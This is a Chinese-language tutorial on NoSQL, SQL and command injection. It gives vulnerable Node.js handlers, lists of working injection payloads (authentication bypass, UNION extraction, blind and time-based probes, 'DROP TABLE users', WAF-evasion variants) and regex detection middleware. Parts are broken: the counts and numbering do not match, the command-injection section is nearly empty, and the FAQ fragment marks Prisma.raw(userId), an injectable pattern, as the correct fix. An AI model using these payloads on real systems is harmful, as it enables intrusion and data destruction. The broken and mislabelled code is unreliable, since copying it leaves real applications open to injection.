## 📚 知识导读

### 什么是代码注入？

**代码注入**（Code Injection）指攻击者将恶意代码注入到应用中执行，从而绕过安全机制、窃取数据或破坏系统。

**注入攻击排名：**
- 🥇 OWASP Top 10 #3（2025）
- 💰 平均损失：$4.24M/次（IBM 2024 报告）
- 📈 占所有漏洞的 19%

## 🎯 NoSQL 注入（MongoDB）

### 1. 攻击原理

**MongoDB 查询操作符**可被滥用：

```javascript
// ❌ 危险：直接使用用户输入
app.post('/login', async (req, res) => {
  const { username, password } = req.body;

  const user = await User.findOne({
    username: username,
    password: password,
  });

  if (user) {
    res.json({ message: 'Login successful' });
  } else {
    res.status(401).json({ error: 'Invalid credentials' });
  }
});
```

**攻击 payload：**

```json
// 正常请求
{
  "username": "admin",
  "password": "password123"
}

// 攻击请求：绕过密码验证
{
  "username": "admin",
  "password": { "$ne": null }
}

// 生成的查询
db.users.findOne({
  username: "admin",
  password: { $ne: null }  // 密码不等于 null（总是 true）
})
```

---

### 2. 15 种 NoSQL 注入攻击方式

```javascript
// 攻击1：$ne（不等于）
{ "password": { "$ne": null } }

// 攻击2：$gt（大于）
{ "password": { "$gt": "" } }

// 攻击3：$regex（正则匹配）
{ "password": { "$regex": ".*" } }

// 攻击4：$where（JavaScript 执行）
{
  "username": "admin",
  "$where": "function() { return true; }"
}

// 攻击5：$or（或条件）
{
  "$or": [
    { "username": "admin" },
    { "username": "root" }
  ]
}

// 攻击6：$in（包含）
{ "role": { "$in": ["admin", "superuser"] } }

// 攻击7：$nin（不包含）
{ "isBlocked": { "$nin": [true] } }

// 攻击8：$exists（字段存在）
{ "password": { "$exists": true } }

// 攻击9：Array 注入
{ "username": ["admin", "root"] }

// 攻击10：盲注入（时间延迟）
{
  "$where": "sleep(5000) || true"
}
```

### 4. MongoDB 注入检测

```javascript
// 检测潜在注入
function detectMongoInjection(value) {
  if (typeof value !== 'string') {
    // 非字符串可能是注入
    return true;
  }

  const dangerousPatterns = [
    /\$where/i,
    /\$ne/i,
    /\$gt/i,
    /\$regex/i,
    /\$or/i,
  ];

  for (const pattern of dangerousPatterns) {
    if (pattern.test(value)) {
      return true;
    }
  }

  return false;
}

// 中间件
app.use((req, res, next) => {
  const checkObject = (obj) => {
    for (const key in obj) {
      if (detectMongoInjection(key) || detectMongoInjection(obj[key])) {
        return res.status(400).json({ error: 'Invalid input detected' });
      }

      if (typeof obj[key] === 'object' && obj[key] !== null) {
        checkObject(obj[key]);
      }
    }
  };

  checkObject(req.body);
  checkObject(req.query);
  next();
});
```

## 🎯 SQL 注入（MySQL/PostgreSQL）

### 1. 攻击原理

**字符串拼接 SQL** 是最常见的漏洞：

```javascript
import mysql from 'mysql2/promise';

// ❌ 危险：字符串拼接
app.get('/api/users/:id', async (req, res) => {
  const userId = req.params.id;

  const sql = `SELECT * FROM users WHERE id = ${userId}`;
  const [rows] = await db.query(sql);

  res.json(rows);
});
```

**攻击 payload：**

```
# 正常请求
GET /api/users/123

# 攻击1：联合查询（UNION）
GET /api/users/123 UNION SELECT * FROM admin_users

# 攻击2：注释绕过
GET /api/users/123' OR '1'='1' --

# 攻击3：堆叠查询
GET /api/users/123; DROP TABLE users; --

# 攻击4：盲注入（布尔）
GET /api/users/123' AND SUBSTRING(password,1,1)='a

# 攻击5：盲注入（时间）
GET /api/users/123' AND SLEEP(5) --
```

---

### 2. 15 种 SQL 注入攻击方式

```sql
-- 1. UNION 查询注入
123 UNION SELECT username, password FROM admin

-- 2. Boolean 盲注
123' AND 1=1 --  (true)
123' AND 1=2 --  (false)

-- 3. 时间盲注
123' AND IF(1=1, SLEEP(5), 0) --

-- 4. 错误注入
123' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT password FROM users LIMIT 1), 0x3a, FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)y) --

-- 5. 堆叠查询
123'; DROP TABLE users; --

-- 6. 注释绕过
123' OR '1'='1' --
123' OR '1'='1' /*
123' OR '1'='1' #

-- 7. 编码绕过
123' OR 0x31=0x31 --  (0x31 = '1')

-- 8. 大小写绕过（绕过 WAF）
123' oR '1'='1' --

-- 9. 内联注释
123' /*!OR*/ '1'='1' --

-- 10. HTTP 参数污染
?id=123&id=' OR '1'='1' --
```

### 4. SQL 注入检测

```javascript
// WAF（Web Application Firewall）规则
function detectSQLInjection(value) {
  const patterns = [
    /(\bUNION\b.*\bSELECT\b)/i,
    /(\bOR\b\s+['"]?\d+['"]?\s*=\s*['"]?\d+['"]?)/i,
    /(\bAND\b\s+['"]?\d+['"]?\s*=\s*['"]?\d+['"]?)/i,
    /(--|\#|\/\*)/,  // SQL 注释
    /(\bDROP\b|\bDELETE\b|\bUPDATE\b|\bINSERT\b)/i,
    /(\bEXEC\b|\bEXECUTE\b)/i,
    /(\bSLEEP\b|\bBENCHMARK\b)/i,
    /(0x[0-9a-f]+)/i,  // 十六进制
  ];

  for (const pattern of patterns) {
    if (pattern.test(value)) {
      return true;
    }
  }

  return false;
}

// 中间件
app.use((req, res, next) => {
  const checkParams = (obj) => {
    for (const key in obj) {
      if (typeof obj[key] === 'string' && detectSQLInjection(obj[key])) {
        console.warn(`SQL Injection attempt detected: ${obj[key]}`);
        return res.status(400).json({ error: 'Invalid input' });
      }
    }
  };

  checkParams(req.query);
  checkParams(req.params);
  checkParams(req.body);

  next();
```

## 🎯 命令注入（Command Injection）

### 1. 攻击原理

**执行 shell 命令时拼接用户输入**：

```javascript
import { exec } from 'child_process';

```

**攻击 payload：**

```bash
# 正常请求
{ "host": "8.8.8.8" }
```

**方法 1：使用数组参数（避免 shell）**

## 📚 FAQ

### 1. ORM 是否完全防止 SQL 注入？

**不一定**。如果使用原始查询（raw query），仍可能存在注入：

```javascript

`;

// ✅ 正确
const result = await prisma.$queryRaw`
  SELECT * FROM users WHERE id = ${Prisma.raw(userId)}
`;
```
